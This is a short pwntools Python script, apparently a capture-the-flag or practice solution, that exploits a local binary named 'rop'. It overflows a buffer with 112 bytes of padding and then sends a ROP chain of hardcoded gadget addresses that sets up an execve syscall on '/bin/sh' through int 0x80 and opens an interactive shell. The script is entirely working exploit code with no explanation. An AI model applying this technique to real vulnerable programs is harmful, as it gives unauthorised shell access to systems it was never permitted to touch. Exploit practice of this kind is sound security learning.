from pwn import *

p=process("./rop")

#p.recvuntil("?")

gdb.attach(p)

eax=0x080bb196

edcbx=0x0806eb90

sh=0x080be408

int_0x80=0x08049421

#payload=flat(["a"*112,eax,0xb,edcbx,0,0,sh,int_0x80])

payload='a'*112+p32(eax)+p32(0xb)+p32(edcbx)+p32(0)+p32(0)+p32(sh)+p32(int_0x80)

p.sendline(payload)


p.interactive()
